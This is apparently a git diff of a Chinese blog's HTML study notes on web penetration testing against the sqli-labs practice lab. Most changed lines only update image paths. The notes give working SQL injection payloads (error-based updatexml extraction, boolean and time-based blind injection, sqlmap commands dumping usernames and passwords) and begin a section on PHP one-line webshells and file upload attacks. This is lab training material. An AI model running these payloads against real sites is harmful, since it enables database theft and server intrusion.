 <h6 id="4-安装靶场webapp"><a href="#4-安装靶场webapp" class="headerlink" title="4.安装靶场webapp"></a>4.安装靶场webapp</h6><p>将靶场文件放在 WWW 目录下即可</p>
 <h5 id="burp调用js加密函数"><a href="#burp调用js加密函数" class="headerlink" title="burp调用js加密函数"></a>burp调用js加密函数</h5><p><strong>1.修改 phantomjs_server.js文件，导入js加密函数</strong></p>
 <p><strong>2.加入自定义js函数改写后</strong></p>
@@ -1291,7 +1296,7 @@ function js_encrypt(payload) &#123;
 &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <h5 id="SHA家族名称"><a href="#SHA家族名称" class="headerlink" title="SHA家族名称"></a>SHA家族名称</h5><p>计算机名词发音网站：<a target="_blank" rel="noopener" href="http://www.howtopronounce.cc/sha1">http://www.howtopronounce.cc/sha1</a></p>
-<p><img src="/2023/01220/35.png" alt="35"></p>
+<p><img src="/2023/01221/35.png" alt="35"></p>
 <h5 id="SHA1"><a href="#SHA1" class="headerlink" title="SHA1"></a>SHA1</h5><p>SHA-1 是最广泛使用和设置的加密哈希函数之一，SSL 证书颁发机构经常使用它来签署证书。SHA-1 是一个 160 位散列，它接受一个输入并生成一个 160 位（20 字节）的散列值，称为消息摘要。它通常由一个 <strong>40</strong> <strong>位长的十六进制字符</strong>串描述。</p>
 <h5 id="SHA256"><a href="#SHA256" class="headerlink" title="SHA256"></a>SHA256</h5><p>SHA256算法使用的哈希值长度是256位。这是一个抽象类，此类的唯一实现是<em>SHA256</em>Managed。对于任意长度的消息，SHA256都会产生一个256bit长度的散列值，称为消息摘要，可以用一个<strong>长度为64</strong>的十六进制字符串**表示</p>
 <h5 id="SHA384"><a href="#SHA384" class="headerlink" title="SHA384"></a>SHA384</h5><p>SHA384是其中比较常见的一种摘要算法，可以用一个<strong>长度为<strong><strong>96</strong></strong>的十六进制</strong>字符串表示</p>
@@ -1351,12 +1356,12 @@ nMSDiMsggTWxcI<span class="token operator">/</span>Lvag6eHjkSc67RTrj96oxj0ipVRqj
 
 <h2 id="SQL注入漏洞1"><a href="#SQL注入漏洞1" class="headerlink" title="SQL注入漏洞1"></a>SQL注入漏洞1</h2><h3 id="靶场环境搭建"><a href="#靶场环境搭建" class="headerlink" title="靶场环境搭建"></a>靶场环境搭建</h3><h4 id="phpstudy切换版本"><a href="#phpstudy切换版本" class="headerlink" title="phpstudy切换版本"></a>phpstudy切换版本</h4><p>配置 phpstudy 中 php 版本为 5.x ，mysql 版本为 5.7.x</p>
 <h4 id="sqli-labs数据库初始化"><a href="#sqli-labs数据库初始化" class="headerlink" title="sqli-labs数据库初始化"></a>sqli-labs数据库初始化</h4><p>初次使用靶场要进行初始化操作，安装数据库</p>
-<p><img src="/2023/01220/38.PNG" alt="38"></p>
+<p><img src="/2023/01221/38.PNG" alt="38"></p>
 <p>显示 successfully 表示安装成功~！</p>
-<p><img src="/2023/01220/39.PNG" alt="39"></p>
+<p><img src="/2023/01221/39.PNG" alt="39"></p>
 <p><strong>默认文件中mysql密码为空，要根据自己mysql密码来修改</strong></p>
 <h4 id="hackbar插件安装"><a href="#hackbar插件安装" class="headerlink" title="hackbar插件安装"></a>hackbar插件安装</h4><p>从文件安装附件组件（HackBar V2目前免费使用）</p>
-<p><img src="/2023/01220/40.PNG" alt="40"></p>
+<p><img src="/2023/01221/40.PNG" alt="40"></p>
 <h3 id="mysql注入常见函数"><a href="#mysql注入常见函数" class="headerlink" title="mysql注入常见函数"></a>mysql注入常见函数</h3><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">函数 <span class="token operator">/</span> 语句                     功能
 
 <span class="token keyword">order</span> <span class="token keyword">by</span>                       按指定列排序，可判断查询结果列数
@@ -1385,7 +1390,7 @@ load_file<span class="token punctuation">(</span><span class="token punctuation"
 <h4 id="内敛注释"><a href="#内敛注释" class="headerlink" title="内敛注释"></a>内敛注释</h4><p>内联注释是MySQL数据库为了保持与其他数据库兼容，特意新添加的功能。</p>
 <p>为了避免从MySQL中导出的SQL语句不能被其他数据库使用，它把一些MySQL特有的语句放在 /*! … */中，这些语句在不兼容的数据库中使用时便不会执行。而MySQL自身却能识别、执行。</p>
 <p> /*!50001 */表示数据库版本&gt;=5.00.01时中间的语句才会执行，在SQL注入中，内联注释常用来绕过waf。</p>
-<p><img src="/2023/01220/41.PNG" alt="41"></p>
+<p><img src="/2023/01221/41.PNG" alt="41"></p>
 <h3 id="SQL注入流程"><a href="#SQL注入流程" class="headerlink" title="SQL注入流程"></a>SQL注入流程</h3><h4 id="1-寻找注入点"><a href="#1-寻找注入点" class="headerlink" title="1.寻找注入点"></a>1.寻找注入点</h4><p>得到目标网站的一般信息和技术分析信息之后，就要寻找注入点和测试注入点，这些点位都是与数据库有交互的地方</p>
 <h5 id="常见注入点在哪里？"><a href="#常见注入点在哪里？" class="headerlink" title="常见注入点在哪里？"></a>常见注入点在哪里？</h5><p>我们一般在三个地方，寻找注入点</p>
 <ol>
@@ -1405,7 +1410,7 @@ load_file<span class="token punctuation">(</span><span class="token punctuation"
 <h5 id="sqli-less1"><a href="#sqli-less1" class="headerlink" title="sqli-less1"></a>sqli-less1</h5><p>发现提交 id 参数值的改变，影响页面结果，猜测后台的sql代码是： select 账号 密码 from 用户表;</p>
 <pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">select username,password from users;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="/2023/01220/42.PNG" alt="42"></p>
+<p><img src="/2023/01221/42.PNG" alt="42"></p>
 <h4 id="2-测试注入点-amp-amp-判断闭合符号"><a href="#2-测试注入点-amp-amp-判断闭合符号" class="headerlink" title="2.测试注入点&amp;&amp;判断闭合符号"></a>2.测试注入点&amp;&amp;判断闭合符号</h4><p>常用的测试符号</p>
 <ul>
 <li><p>单引号 ‘</p>
@@ -1420,7 +1425,7 @@ load_file<span class="token punctuation">(</span><span class="token punctuation"
 <p>这些符号通常是服务器后台代码中用来包裹用户输入变量的字符，当插入正确的闭合字符时，会破坏原有的sql语句；</p>
 <h5 id="根据报错信息判断闭合符号"><a href="#根据报错信息判断闭合符号" class="headerlink" title="根据报错信息判断闭合符号"></a>根据报错信息判断闭合符号</h5><p><strong>输入</strong>常用<strong>闭合符</strong>号<strong>使</strong>页面抛出<strong>sql****语法</strong>错误的<strong>报错</strong>信息，根据报错信息可以发现闭合符号</p>
 <p>less1</p>
-<p><img src="/2023/01220/43.PNG" alt="43"></p>
+<p><img src="/2023/01221/43.PNG" alt="43"></p>
 <pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql"># 最外层的一对单引号是 mysql 报错打印模块自己加上的，去除掉以后，得到原始的报错代码段
 报错字符串为： &#39;&#39;3&#39;&#39; LIMIT 0,1&#39;
 # 去掉 最外层的一对引号
@@ -1449,7 +1454,7 @@ load_file<span class="token punctuation">(</span><span class="token punctuation"
 
 <h5 id="order-by语句"><a href="#order-by语句" class="headerlink" title="order by语句"></a>order by语句</h5><p>要注意的是联合查询前后两条 select 语句查询数据的列数是相等的，故需要使用 order by 语句来判断注入点sql语句查询的列数是多少</p>
 <p>order by 排序超过查询结果列数的时候就会抛出错误，故可以使用它来判断前一条 select 语句查询结果的列数</p>
-<p><img src="/2023/01220/44.PNG" alt="44"></p>
+<p><img src="/2023/01221/44.PNG" alt="44"></p>
 <h6 id="二分法查找列数"><a href="#二分法查找列数" class="headerlink" title="二分法查找列数"></a>二分法查找列数</h6><p>先 order by 一个比较大的数字m，若报错再取其中位数 n 继续 order by， 若正常说明列数在 [n, m) 之间， 再取 n , m 之间的中位数 order by 如此反复多次，即可获取列数</p>
 <h3 id="查询数据库内容常见语句"><a href="#查询数据库内容常见语句" class="headerlink" title="查询数据库内容常见语句"></a>查询数据库内容常见语句</h3><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">1.暴库：select group_concat(schema_name) from information_schema.schemata;
 
@@ -1523,23 +1528,23 @@ count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group b
 <p>updatexml的第二个参数需要Xpath格式的字符串，是用/xxx/xxx/xxx/…这种格式，以~开头的内容不是xml格式的语法，concat()函数为字符串连接函数显然不符合规则，但是会将括号内的执行结果以错误的形式报出</p>
 <p>该函数最大显示长度为32，超过长度可以配合substr、limit等函数来显示</p>
 <h4 id="sqli-less5注入"><a href="#sqli-less5注入" class="headerlink" title="sqli-less5注入"></a>sqli-less5注入</h4><p>输入参数 id=1 发现没有查询结果的回显</p>
-<p><img src="/2023/01220/45.PNG" alt="45"></p>
+<p><img src="/2023/01221/45.PNG" alt="45"></p>
 <h5 id="寻找注入点"><a href="#寻找注入点" class="headerlink" title="寻找注入点"></a>寻找注入点</h5><p>输入单引号后报错根据报错信息可知，闭合符号为单引号且非常重要的一点是，该页面能够抛出sql语句的报错信息</p>
-<p><img src="/2023/01220/46.PNG" alt="46"></p>
+<p><img src="/2023/01221/46.PNG" alt="46"></p>
 <h5 id="注入代码"><a href="#注入代码" class="headerlink" title="注入代码"></a>注入代码</h5><p>进行 union select 注入测试后发现没有结果回显，但因为页面能抛出报错信息，故选用报错注入</p>
 <pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">payload: id&#x3D;1&#39; and (updatexml(1,concat(0x7e,(select user()),0x7e),1)); -- +<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="/2023/01220/47.PNG" alt="47"></p>
+<p><img src="/2023/01221/47.PNG" alt="47"></p>
 <h5 id="暴库-amp-amp-暴数据"><a href="#暴库-amp-amp-暴数据" class="headerlink" title="暴库&amp;&amp;暴数据"></a>暴库&amp;&amp;暴数据</h5><p>暴库或者暴数据的时候可能会遇到一些问题，sql语句的查询结果很长，但是updatexml函数只能抛出32位长度的报错信息，这个时候就要用到substr函数分段截取显示结果 或者 limit 逐行显示结果<strong>substr(str, start, length)</strong> 注意索引从 1 开始，每次截取 32 位，第二次索引从 32 开始再截取 32 位，以此类推</p>
 <h6 id="暴库"><a href="#暴库" class="headerlink" title="暴库"></a>暴库</h6><p><strong>substr</strong></p>
 <pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">payload: id&#x3D;1&#39; and (updatexml(1,concat(0x7e,substr((select 
 group_concat(schema_name) from information_schema.schemata),0,32),0x7e),1)); -- +<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
-<p><img src="/2023/01220/48.PNG" alt="48"></p>
+<p><img src="/2023/01221/48.PNG" alt="48"></p>
 <p>limit</p>
 <pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">payload: id&#x3D;1&#39; and (updatexml(1,concat(0x7e,substr((select schema_name from information_schema.schemata limit 0,1),1,32),0x7e),1)); -- +<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="/2023/01220/49.PNG" alt="49"></p>
+<p><img src="/2023/01221/49.PNG" alt="49"></p>
 <h6 id="暴表"><a href="#暴表" class="headerlink" title="暴表"></a>暴表</h6><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">payload: id&#x3D;1&#39; and (updatexml(1,concat(0x7e,substr((select 
 group_concat(table_name) from information_schema.tables where 
 table_schema&#x3D;&#39;security&#39;),1,32),0x7e),1)); -- +<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
@@ -1554,9 +1559,9 @@ group_concat(username,0x3a,password) from security.users),1,32),0x7e),1)); -- +<
 <h3 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h3><p>布尔盲注一般适用于页面没有回显字段不支持联合查询和报错注入，且web页面返回True 或者 false，构造SQL语句，利用and，or等关键字来其后的语句 true 或 false 使web页面返回 true 或 false，从而达到注入的目的来获取信息</p>
 <h4 id="sqli-less8"><a href="#sqli-less8" class="headerlink" title="sqli-less8"></a>sqli-less8</h4><p>单纯的输入某个符号不能判断出真正的闭合符号是什么，但是可以通过在语句后拼接 and 1 及 and 0来判断sql语句有没有成功执行，如果sql语句执行了说明你的闭合符号找对了</p>
 <h4 id="判断闭合符号"><a href="#判断闭合符号" class="headerlink" title="判断闭合符号"></a>判断闭合符号</h4><p><strong>输入</strong> <strong>id = 1’ and 1 – +</strong> <strong>页面内容显示正常</strong></p>
-<p><img src="/2023/01220/50.PNG" alt="50"></p>
+<p><img src="/2023/01221/50.PNG" alt="50"></p>
 <p><strong>输入</strong> <strong>id = 1’ and 0 – +</strong> <strong>页面显示不正常</strong></p>
-<p><img src="/2023/01220/51.PNG" alt="51"></p>
+<p><img src="/2023/01221/51.PNG" alt="51"></p>
 <p><strong>由此判断出闭合符号位单引号</strong></p>
 <h4 id="查询数据内容"><a href="#查询数据内容" class="headerlink" title="查询数据内容"></a>查询数据内容</h4><p>由于没有回显，我们只能利用一些函数来构造等式，判断数据内容</p>
 <p>length() 函数返回一个字符串的长度，可以以用来判断字符串 sql 查询结果的长度</p>
@@ -1570,15 +1575,15 @@ and left(database(),8)&#x3D;&#39;security&#39; -- + # 截取指定长度结果�
 ascii(substr(database(),1,1))&#x3D;115 -- + # 使用ascii码一位一位比对截取到的字符<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <h4 id="burp盲注爆破"><a href="#burp盲注爆破" class="headerlink" title="burp盲注爆破"></a>burp盲注爆破</h4><p>标记参数</p>
-<p><img src="/2023/01220/52.PNG" alt="52"></p>
+<p><img src="/2023/01221/52.PNG" alt="52"></p>
 <p>payload1是 1-8 的数字</p>
-<p><img src="/2023/01220/53.PNG" alt="53"></p>
+<p><img src="/2023/01221/53.PNG" alt="53"></p>
 <p>payload2 是0~9、a-z、以及一些常见字符</p>
-<p><img src="/2023/01220/54.PNG" alt="54"></p>
+<p><img src="/2023/01221/54.PNG" alt="54"></p>
 <p>结果判断条件</p>
-<p><img src="/2023/01220/55.PNG" alt="55"></p>
+<p><img src="/2023/01221/55.PNG" alt="55"></p>
 <p>根据响应包来判断每一位字符,按顺序拼凑起来结果是 security</p>
-<p><img src="/2023/01220/56.PNG" alt="56"></p>
+<p><img src="/2023/01221/56.PNG" alt="56"></p>
 <p><strong>在进行暴库&amp;&amp;暴数据时都要先判断sql查询结果的长度，可以用二分法快速判断</strong></p>
 <p>例如判断所有库名的长度</p>
 <pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">payload: id&#x3D;1&#39; and length((select group_concat(schema_name) from 
@@ -1599,7 +1604,7 @@ table_schema&#x3D;&#39;security&#39;),1,1)&#x3D;&#39;i&#39; -- +<span aria-hidde
 <h3 id="延时注入"><a href="#延时注入" class="headerlink" title="延时注入"></a>延时注入</h3><p>延时注入是盲注的一种，在页面没有回显和报错，也不能通过拼接 and 0 、and 1 的布尔表达式来判断sql语句是否成功执行，只能在参数后and sleep(5) ， 加上延时函数sleep()， 如果sql语句执行页面刷新就会有一定的延时，根据页面是否有延时来判断sql语句执行与否所以叫做延时注入</p>
 <h4 id="sqli-less9"><a href="#sqli-less9" class="headerlink" title="sqli-less9"></a>sqli-less9</h4><p>单纯的输入某个符号不能判断出真正的闭合符号是什么，但是可以通过在语句后拼接 and sleep(5) 来判断sql语句有没有成功执行，如果sql语句执行了说明你的闭合符号找对了</p>
 <h4 id="判断闭合符号-1"><a href="#判断闭合符号-1" class="headerlink" title="判断闭合符号"></a>判断闭合符号</h4><p><strong>输入</strong> <strong>id=1’ and sleep(3) – +</strong> <strong>页面有3秒延时</strong></p>
-<p><img src="/2023/01220/57.PNG" alt="57"></p>
+<p><img src="/2023/01221/57.PNG" alt="57"></p>
 <p><strong>由此判断出闭合符号位单引号</strong></p>
 <h4 id="查询数据内容-1"><a href="#查询数据内容-1" class="headerlink" title="查询数据内容"></a>查询数据内容</h4><p>由于没有回显，我们只能利用一些函数来构造等式，判断数据内容</p>
 <p>length() 函数返回一个字符串的长度，可以以用来判断字符串 sql 查询结果的长度</p>
@@ -1893,31 +1898,31 @@ session<span class="token punctuation">.</span>mount<span class="token punctuati
 <h4 id="sqlmap基本使用"><a href="#sqlmap基本使用" class="headerlink" title="sqlmap基本使用"></a>sqlmap基本使用</h4><h5 id="1-检测注入点"><a href="#1-检测注入点" class="headerlink" title="1.检测注入点"></a>1.检测注入点</h5><p>检测是否存在sql注入漏洞，注意get型注入提交的url中要有含义参数</p>
 <pre class="line-numbers language-python" data-language="python"><code class="language-python">python sqlmap<span class="token punctuation">.</span>py <span class="token operator">-</span>u http<span class="token punctuation">:</span><span class="token operator">//</span>www<span class="token punctuation">.</span>sqli<span class="token punctuation">.</span>com<span class="token operator">/</span>Less<span class="token operator">-</span><span class="token number">1</span><span class="token operator">/</span>?<span class="token builtin">id</span><span class="token operator">=</span><span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="/2023/01220/58.PNG" alt="58"></p>
+<p><img src="/2023/01221/58.PNG" alt="58"></p>
 <p>如果结果中给出了注入点相关信息及payload，说明存在注入，可进一步挖掘数据</p>
-<p><img src="/2023/01220/59.PNG" alt="59"></p>
+<p><img src="/2023/01221/59.PNG" alt="59"></p>
 <h5 id="2-暴库"><a href="#2-暴库" class="headerlink" title="2.暴库"></a>2.暴库</h5><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># 获取当前库名</span>
 python sqlmap<span class="token punctuation">.</span>py <span class="token operator">-</span>u http<span class="token punctuation">:</span><span class="token operator">//</span>www<span class="token punctuation">.</span>sqli<span class="token punctuation">.</span>com<span class="token operator">/</span>Less<span class="token operator">-</span><span class="token number">1</span><span class="token operator">/</span>?<span class="token builtin">id</span><span class="token operator">=</span><span class="token number">1</span> <span class="token operator">-</span><span class="token operator">-</span>current<span class="token operator">-</span>db<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
-<p><img src="/2023/01220/60.PNG" alt="60"></p>
+<p><img src="/2023/01221/60.PNG" alt="60"></p>
 <pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># 获取所有库名</span>
 python sqlmap<span class="token punctuation">.</span>py <span class="token operator">-</span>u http<span class="token punctuation">:</span><span class="token operator">//</span>www<span class="token punctuation">.</span>sqli<span class="token punctuation">.</span>com<span class="token operator">/</span>Less<span class="token operator">-</span><span class="token number">1</span><span class="token operator">/</span>?<span class="token builtin">id</span><span class="token operator">=</span><span class="token number">1</span> <span class="token operator">-</span><span class="token operator">-</span>dbs<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
-<p><img src="/2023/01220/61.PNG" alt="61"></p>
+<p><img src="/2023/01221/61.PNG" alt="61"></p>
 <h5 id="3-暴表"><a href="#3-暴表" class="headerlink" title="3.暴表"></a>3.暴表</h5><pre class="line-numbers language-python" data-language="python"><code class="language-python">python sqlmap<span class="token punctuation">.</span>py <span class="token operator">-</span>u http<span class="token punctuation">:</span><span class="token operator">//</span>www<span class="token punctuation">.</span>sqli<span class="token punctuation">.</span>com<span class="token operator">/</span>Less<span class="token operator">-</span><span class="token number">1</span><span class="token operator">/</span>?<span class="token builtin">id</span><span class="token operator">=</span><span class="token number">1</span> <span class="token operator">-</span>D security <span class="token operator">-</span><span class="token operator">-</span>tables<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="/2023/01220/62.PNG" alt="62"></p>
+<p><img src="/2023/01221/62.PNG" alt="62"></p>
 <h5 id="4-暴字段"><a href="#4-暴字段" class="headerlink" title="4.暴字段"></a>4.暴字段</h5><pre class="line-numbers language-python" data-language="python"><code class="language-python">python sqlmap<span class="token punctuation">.</span>py <span class="token operator">-</span>u http<span class="token punctuation">:</span><span class="token operator">//</span>www<span class="token punctuation">.</span>sqli<span class="token punctuation">.</span>com<span class="token operator">/</span>Less<span class="token operator">-</span><span class="token number">1</span><span class="token operator">/</span>?<span class="token builtin">id</span><span class="token operator">=</span><span class="token number">1</span> <span class="token operator">-</span>D security <span class="token operator">-</span>T users <span class="token operator">-</span><span class="token operator">-</span>cloums<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="/2023/01220/63.PNG" alt="63"></p>
+<p><img src="/2023/01221/63.PNG" alt="63"></p>
 <h5 id="5-暴数据"><a href="#5-暴数据" class="headerlink" title="5.暴数据"></a>5.暴数据</h5><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># 获取 security 库中 users 表中所有数据内容</span>
 python sqlmap<span class="token punctuation">.</span>py <span class="token operator">-</span>u http<span class="token punctuation">:</span><span class="token operator">//</span>www<span class="token punctuation">.</span>sqli<span class="token punctuation">.</span>com<span class="token operator">/</span>Less<span class="token operator">-</span><span class="token number">1</span><span class="token operator">/</span>?<span class="token builtin">id</span><span class="token operator">=</span><span class="token number">1</span> <span class="token operator">-</span>D security <span class="token operator">-</span>T users <span class="token operator">-</span><span class="token operator">-</span>dump<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
-<p><img src="/2023/01220/64.PNG" alt="64"></p>
+<p><img src="/2023/01221/64.PNG" alt="64"></p>
 <pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># 获取指定字段数据内容</span>
 python sqlmap<span class="token punctuation">.</span>py <span class="token operator">-</span>u http<span class="token punctuation">:</span><span class="token operator">//</span>www<span class="token punctuation">.</span>sqli<span class="token punctuation">.</span>com<span class="token operator">/</span>Less<span class="token operator">-</span><span class="token number">1</span><span class="token operator">/</span>?<span class="token builtin">id</span><span class="token operator">=</span><span class="token number">1</span> <span class="token operator">-</span>D security <span class="token operator">-</span>T users <span class="token operator">-</span>C password<span class="token punctuation">,</span>username <span class="token operator">-</span><span class="token operator">-</span>dump<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
-<p><img src="/2023/01220/65.PNG" alt="65"></p>
+<p><img src="/2023/01221/65.PNG" alt="65"></p>
 <h4 id="常见参数-1"><a href="#常见参数-1" class="headerlink" title="常见参数"></a>常见参数</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python">参数 							含义
 <span class="token operator">-</span>p 				标记注入点（指定注入参数）
 <span class="token operator">-</span><span class="token operator">-</span>data 指定post参数 eg<span class="token punctuation">:</span> <span class="token operator">-</span><span class="token operator">-</span>data <span class="token string">"userid=aaa&amp;passwd=bbbb"</span>
@@ -1960,8 +1965,1285 @@ Connection<span class="token punctuation">:</span> close
 uname<span class="token operator">=</span>admin<span class="token operator">&amp;</span>passwd<span class="token operator">=</span><span class="token number">123123</span><span class="token operator">&amp;</span>submit<span class="token operator">=</span>Submit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <h3 id="SQLMAP参数大全"><a href="#SQLMAP参数大全" class="headerlink" title="SQLMAP参数大全"></a>SQLMAP参数大全</h3><p><a target="_blank" rel="noopener" href="https://app.yinxiang.com/fx/a2dd7f1f-f40a-4315-be93-7c4124073e67">https://app.yinxiang.com/fx/a2dd7f1f-f40a-4315-be93-7c4124073e67</a></p>
-<h2 id="SQL注入漏洞"><a href="#SQL注入漏洞" class="headerlink" title="SQL注入漏洞"></a>SQL注入漏洞</h2><h3 id="POST注入"><a href="#POST注入" class="headerlink" title="POST注入"></a>POST注入</h3><p>post注入就是参数以post形式提交且提交的参数与数据库有交互</p>
-<h4 id="sqli-less11-select注入"><a href="#sqli-less11-select注入" class="headerlink" title="sqli-less11 select注入"></a>sqli-less11 select注入</h4><h5 id="1-寻找注入点-1"><a href="#1-寻找注入点-1" class="headerlink" title="1.寻找注入点"></a>1.寻找注入点</h5><h5 id="2-判断闭合符号-amp-amp-测试注入点"><a href="#2-判断闭合符号-amp-amp-测试注入点" class="headerlink" title="2.判断闭合符号&amp;&amp;测试注入点"></a>2.判断闭合符号&amp;&amp;测试注入点</h5><h5 id="3-注入SQL语句"><a href="#3-注入SQL语句" class="headerlink" title="3.注入SQL语句"></a>3.注入SQL语句</h5><h5 id="4-sqlmap注入"><a href="#4-sqlmap注入" class="headerlink" title="4.sqlmap注入"></a>4.sqlmap注入</h5><h4 id="sqli-less17-update注入"><a href="#sqli-less17-update注入" class="headerlink" title="sqli-less17 update注入"></a>sqli-less17 update注入</h4><h5 id="1-寻找注入点-2"><a href="#1-寻找注入点-2" class="headerlink" title="1.寻找注入点"></a>1.寻找注入点</h5><h5 id="2-判断闭合符号-amp-amp-测试注入点-1"><a href="#2-判断闭合符号-amp-amp-测试注入点-1" class="headerlink" title="2.判断闭合符号&amp;&amp;测试注入点"></a>2.判断闭合符号&amp;&amp;测试注入点</h5><h5 id="3-注入SQL语句-1"><a href="#3-注入SQL语句-1" class="headerlink" title="3.注入SQL语句"></a>3.注入SQL语句</h5><h5 id="4-sqlmap注入-1"><a href="#4-sqlmap注入-1" class="headerlink" title="4.sqlmap注入"></a>4.sqlmap注入</h5><h5 id="5-update注入注意事项"><a href="#5-update注入注意事项" class="headerlink" title="5.update注入注意事项"></a>5.update注入注意事项</h5><h3 id="header头-referer-注入"><a href="#header头-referer-注入" class="headerlink" title="header头(referer)注入"></a>header头(referer)注入</h3><h3 id="Cookie注入"><a href="#Cookie注入" class="headerlink" title="Cookie注入"></a>Cookie注入</h3><h3 id="文件读写注入"><a href="#文件读写注入" class="headerlink" title="文件读写注入"></a>文件读写注入</h3>
+<h2 id="SQL注入漏洞4"><a href="#SQL注入漏洞4" class="headerlink" title="SQL注入漏洞4"></a>SQL注入漏洞4</h2><h3 id="POST注入"><a href="#POST注入" class="headerlink" title="POST注入"></a>POST注入</h3><p>post注入就是参数以post形式提交且提交的参数与数据库有交互</p>
+<h4 id="sqli-less11-select注入"><a href="#sqli-less11-select注入" class="headerlink" title="sqli-less11 select注入"></a>sqli-less11 select注入</h4><h5 id="1-寻找注入点-1"><a href="#1-寻找注入点-1" class="headerlink" title="1.寻找注入点"></a>1.寻找注入点</h5><h5 id="2-判断闭合符号-amp-amp-测试注入点"><a href="#2-判断闭合符号-amp-amp-测试注入点" class="headerlink" title="2.判断闭合符号&amp;&amp;测试注入点"></a>2.判断闭合符号&amp;&amp;测试注入点</h5><h5 id="3-注入SQL语句"><a href="#3-注入SQL语句" class="headerlink" title="3.注入SQL语句"></a>3.注入SQL语句</h5><h5 id="4-sqlmap注入"><a href="#4-sqlmap注入" class="headerlink" title="4.sqlmap注入"></a>4.sqlmap注入</h5><h4 id="sqli-less17-update注入"><a href="#sqli-less17-update注入" class="headerlink" title="sqli-less17 update注入"></a>sqli-less17 update注入</h4><h5 id="1-寻找注入点-2"><a href="#1-寻找注入点-2" class="headerlink" title="1.寻找注入点"></a>1.寻找注入点</h5><h5 id="2-判断闭合符号-amp-amp-测试注入点-1"><a href="#2-判断闭合符号-amp-amp-测试注入点-1" class="headerlink" title="2.判断闭合符号&amp;&amp;测试注入点"></a>2.判断闭合符号&amp;&amp;测试注入点</h5><h5 id="3-注入SQL语句-1"><a href="#3-注入SQL语句-1" class="headerlink" title="3.注入SQL语句"></a>3.注入SQL语句</h5><h5 id="4-sqlmap注入-1"><a href="#4-sqlmap注入-1" class="headerlink" title="4.sqlmap注入"></a>4.sqlmap注入</h5><h5 id="5-update注入注意事项"><a href="#5-update注入注意事项" class="headerlink" title="5.update注入注意事项"></a>5.update注入注意事项</h5><h3 id="header头-referer-注入"><a href="#header头-referer-注入" class="headerlink" title="header头(referer)注入"></a>header头(referer)注入</h3><h3 id="Cookie注入"><a href="#Cookie注入" class="headerlink" title="Cookie注入"></a>Cookie注入</h3><h3 id="文件读写注入"><a href="#文件读写注入" class="headerlink" title="文件读写注入"></a>文件读写注入</h3><h2 id="一句话木马与文件上传漏洞"><a href="#一句话木马与文件上传漏洞" class="headerlink" title="一句话木马与文件上传漏洞"></a>一句话木马与文件上传漏洞</h2><h3 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h3><p>​        文件上传漏洞是指用户上传了一个可执行的脚本文件（php、jsp、xml、cer等文件），而 WEB 系统没有进行检测或逻辑做的不够安全。文件上传功能本身没有问题，问题在于上传后如何处理及解释文件。</p>
+<p>​        文件上传攻击是指攻击者利用 Web 应用对上传文件过滤不严的漏洞，将应用程序定义类型范围之外的文件上传到 Web 服务器，并且此类文件通常为木马，在上传成功后，攻击者即可获得当前的webshell。</p>
+<h3 id="一句话木马"><a href="#一句话木马" class="headerlink" title="一句话木马"></a>一句话木马</h3><p>​        木马，全称特洛伊木马(Trojan Horse)是指寄宿在计算机里的一种非授权的远程控制程序。由于特洛伊木马程序能够在计算机管理员未发觉的情况下开放系统权限、泄漏用户信息、甚至窃取整个计算机管理使用权限，使得它成为了黑客们最为常用的工具之一。</p>
+<p>​        一句话木马就是一段简单的代码，就这短短的一行代码，就能做到和大马相当的功能。一句话木马短小精悍，而且功能强大，隐蔽性非常好，在入侵中始终扮演着强大的作用.</p>
+<h3 id="一句话木马尝试"><a href="#一句话木马尝试" class="headerlink" title="一句话木马尝试"></a>一句话木马尝试</h3><ol>
+<li><p>准备一个php文件shell.php，里面写入一下内容：</p>
